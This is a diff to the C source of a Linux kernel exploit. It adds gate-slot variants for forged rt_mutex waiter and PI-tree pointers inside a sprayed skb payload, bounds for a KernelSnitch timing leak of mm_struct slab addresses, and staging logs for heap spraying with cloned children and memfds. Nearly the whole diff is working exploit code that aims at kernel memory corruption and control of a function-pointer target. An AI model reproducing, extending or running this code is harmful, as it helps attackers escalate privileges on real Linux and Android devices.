@@ -248,12 +248,45 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
   uintptr_t waiter = payload_base + waiter_off;
   uintptr_t pi_right = 0;
   uintptr_t pi_left = target;
+  uintptr_t tree_parent = 1;
+  uintptr_t tree_left = 0;
   uintptr_t lock_owner = SLIDE_LOCK_OWNER_VALUE;
   uintptr_t waiter_task = task;
   uintptr_t task_group = 0;
   uintptr_t pi_waiters = waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF;
   uintptr_t pi_top_task = task;
   uint32_t waiter_prio = SLIDE_FAKE_WAITER_PRIO;
+
+#if defined(APP_P0_GATE_PI_RIGHT) && APP_P0_GATE_PI_RIGHT && \
+    defined(P0_ORACLE_GATE_SLOT)
+  /* The diagnostic gate uses the opposite PI-tree child direction from the
+   * legacy bank default.  Keep this isolated to the gate slot so the later
+   * production slot retains its target-profile direction. */
+  if (slot == P0_ORACLE_GATE_SLOT) {
+    pi_right = target;
+    pi_left = 0;
+  }
+#endif
+
+#if defined(APP_P0_GATE_TREE_LEFT) && APP_P0_GATE_TREE_LEFT && \
+    defined(P0_ORACLE_GATE_SLOT)
+  /* Keep the reclaimed gate waiter identical to the pselect-side waiter.
+   * The previous profile used a null lock-tree child in the reclaimed copy
+   * while the pselect stack carried the target in tree_left. */
+  if (slot == P0_ORACLE_GATE_SLOT) {
+    tree_left = target;
+  }
+#endif
+
+#if defined(APP_P0_GATE_TREE_PARENT_DIRECT) && \
+    APP_P0_GATE_TREE_PARENT_DIRECT && defined(P0_ORACLE_GATE_SLOT)
+  /* Some target kernels keep the reclaimed lock-tree parent as a direct
+   * rb-node address.  The pselect-side waiter already uses the direct page
+   * parent; make the gate bank match it without changing production slots. */
+  if (slot == P0_ORACLE_GATE_SLOT) {
+    tree_parent = parent;
+  }
+#endif
 
 #if defined(P0_ORACLE_PRODUCTION_SLOT)
   if (slot == P0_ORACLE_PRODUCTION_SLOT) {
@@ -284,7 +317,7 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
   put64(p, lock_off + 0x08, waiter);
   put64(p, lock_off + 0x10, waiter);
   put64(p, lock_off + 0x18, lock_owner);
-  put_fake_waiter(p, waiter_off, 1, 0, 0, parent, pi_right, pi_left,
+  put_fake_waiter(p, waiter_off, tree_parent, 0, tree_left, parent, pi_right, pi_left,
                   waiter_task, lock, waiter_prio);
   put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
   put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
@@ -304,10 +337,28 @@ void setup_kernelsnitch(void) {
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
       KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(APP_P0_PIPE_MIN_BASE) && defined(APP_P0_PIPE_MAX_BASE) && \
+    defined(APP_P0_MIN_OBJECT_INDEX) && defined(APP_P0_MAX_OBJECT_INDEX)
+  /* P0 uses the same mm_struct-backed slab signal as the slide route, but
+   * must not scan the entire direct-map alias range.  The previous broad
+   * scan spent the timeout on false high-half candidates; the old narrow
+   * end also excluded the observed valid slab around ffffff858d9b0000.
+   * The mm_struct can occupy any object in a slab after reboot, so keep the
+   * object-index filter broad while retaining the bounded direct-map window. */
+  kernelsnitch_set_search_bounds(
+      ks, APP_P0_PIPE_MIN_BASE, APP_P0_PIPE_MAX_BASE,
+      APP_P0_MIN_OBJECT_INDEX, APP_P0_MAX_OBJECT_INDEX, 1);
+  pr_info("p0 KernelSnitch bounds=[%016llx,%016llx) objects=%d..%d\n",
+          (unsigned long long)APP_P0_PIPE_MIN_BASE,
+          (unsigned long long)APP_P0_PIPE_MAX_BASE,
+          APP_P0_MIN_OBJECT_INDEX, APP_P0_MAX_OBJECT_INDEX);
+#endif
   configure_kernelsnitch_profile(ks, PAGE_PAYLOAD_SLIDE);
 #else
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
+      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   kernelsnitch_set_profile(
       ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
@@ -325,7 +376,6 @@ void run_kernelsnitch_bruteforce(void) {
   kernelsnitch_bruteforce(ks);
 }
 
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 static uintptr_t canonicalize_kernelsnitch_pointer(uintptr_t leaked) {
 #if KERNELSNITCH_MTE_ENABLED
   if (leaked != (uintptr_t)-1) {
@@ -337,16 +387,11 @@ static uintptr_t canonicalize_kernelsnitch_pointer(uintptr_t leaked) {
 #endif
   return leaked;
 }
-#endif
 
 uintptr_t cleanup_kernelsnitch(void) {
   uintptr_t leaked = kernelsnitch_cleanup(ks);
   ks = NULL;
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   return canonicalize_kernelsnitch_pointer(leaked);
-#else
-  return leaked;
-#endif
 }
 
 void read_first_line(const char *path, char *buf, size_t len) {
@@ -779,14 +824,40 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         uintptr_t task = payload_base + task_off;
         uintptr_t lock = payload_base + lock_off;
         uintptr_t waiter = payload_base + waiter_off;
+        uintptr_t bank_tree_parent = 1;
+        uintptr_t bank_tree_left = 0;
+        uintptr_t bank_pi_right = 0;
+        uintptr_t bank_pi_left = target;
+
+#if defined(APP_P0_GATE_PI_RIGHT) && APP_P0_GATE_PI_RIGHT && \
+    defined(P0_ORACLE_GATE_SLOT)
+        if (slot == P0_ORACLE_GATE_SLOT) {
+          bank_pi_right = target;
+          bank_pi_left = 0;
+        }
+#endif
+
+#if defined(APP_P0_GATE_TREE_LEFT) && APP_P0_GATE_TREE_LEFT && \
+    defined(P0_ORACLE_GATE_SLOT)
+        if (slot == P0_ORACLE_GATE_SLOT) {
+          bank_tree_left = target;
+        }
+#endif
+
+#if defined(APP_P0_GATE_TREE_PARENT_DIRECT) && \
+    APP_P0_GATE_TREE_PARENT_DIRECT && defined(P0_ORACLE_GATE_SLOT)
+        if (slot == P0_ORACLE_GATE_SLOT) {
+          bank_tree_parent = parent;
+        }
+#endif
 
         put32(p, lock_off + 0x00, 0);
         put64(p, lock_off + 0x08, waiter);
         put64(p, lock_off + 0x10, waiter);
         put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);
 
-        put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task,
-                        lock, SLIDE_FAKE_WAITER_PRIO);
+        put_fake_waiter(p, waiter_off, bank_tree_parent, 0, bank_tree_left, parent, bank_pi_right,
+                        bank_pi_left, task, lock, SLIDE_FAKE_WAITER_PRIO);
 
         put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
         put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
@@ -882,8 +953,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         put64(p, off + 0x08, 0x4141000000000000ULL | off);
       }
     }
-    return 1;
-  }
+  return 1;
+}
+
 #endif
 
   uintptr_t write_pc = fake_fops;
@@ -1017,12 +1089,18 @@ static void cleanup_failed_kernel_page(const char *reason) {
 #endif
 
 uintptr_t prepare_kernel_page(int payload_mode) {
+  pr_info("kernel page stage=begin mode=%d p0_base=%016zx\n",
+          payload_mode, pipebuf_page_base);
   close_reclaim_sockets();
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   cleanup_page_prepare_state();
 #endif
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
   prepare_ctxs();
+  pr_info("kernel page stage=contexts mode=%d mm_objs_per_slab=%zu "
+          "prepare=%zu spray=%zu pre=%zu post=%zu\n",
+          payload_mode, mm_objs_per_slab, prepare_ctx.mm_cnt,
+          spray_ctx.mm_cnt, pre_ctx.mm_cnt, post_ctx.mm_cnt);
 
   skb_buf = malloc(SKB_SEND_SIZE);
   memset(skb_buf, 0x41, SKB_SEND_SIZE);
@@ -1030,20 +1108,32 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     prepare_ctx.childs[i] = clone_child();
   }
+  pr_info("kernel page stage=prepare-children-created count=%zu\n",
+          prepare_ctx.mm_cnt);
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
   }
+  pr_info("kernel page stage=prepare-memfds-opened count=%zu\n",
+          prepare_ctx.mm_cnt);
 
   for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
     spray_ctx.childs[i] = clone_child();
     spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
   }
+  pr_info("kernel page stage=spray-ready count=%zu\n", spray_ctx.mm_cnt);
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  size_t kernel_collisions = KSNITCH_COLLISIONS;
+#if defined(KERNELSNITCH_KERNEL_PAGE_COLLISIONS)
+  kernel_collisions = KERNELSNITCH_KERNEL_PAGE_COLLISIONS;
+#endif
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, kernel_collisions,
       KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
+#if defined(KERNELSNITCH_KERNEL_PAGE_THRESHOLD_MULT)
+  ks->threshold_mult = KERNELSNITCH_KERNEL_PAGE_THRESHOLD_MULT;
+#endif
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(APP_KERNEL_PAGE_KSNITCH_IDENTITY_END) && \
     defined(APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION)
@@ -1053,11 +1143,19 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     search_min_object_index = APP_SLIDE_MIN_OBJECT_INDEX;
     search_max_object_index = APP_SLIDE_MAX_OBJECT_INDEX;
   }
+  uintptr_t search_start = KERNELSNITCH_IDENTITY_START;
+#ifdef APP_KERNEL_PAGE_KSNITCH_IDENTITY_START
+  search_start = APP_KERNEL_PAGE_KSNITCH_IDENTITY_START;
+#endif
   kernelsnitch_set_search_bounds(
-      ks, KERNELSNITCH_IDENTITY_START,
-      APP_KERNEL_PAGE_KSNITCH_IDENTITY_END,
+      ks, search_start, APP_KERNEL_PAGE_KSNITCH_IDENTITY_END,
       search_min_object_index, search_max_object_index,
       APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION);
+  pr_info("kernel page KernelSnitch bounds=[%016llx,%016llx) "
+          "objects=%zu..%zu mode=%d\n",
+          (unsigned long long)search_start,
+          (unsigned long long)APP_KERNEL_PAGE_KSNITCH_IDENTITY_END,
+          search_min_object_index, search_max_object_index, payload_mode);
 #endif
   configure_kernelsnitch_profile(ks, payload_mode);
 #else
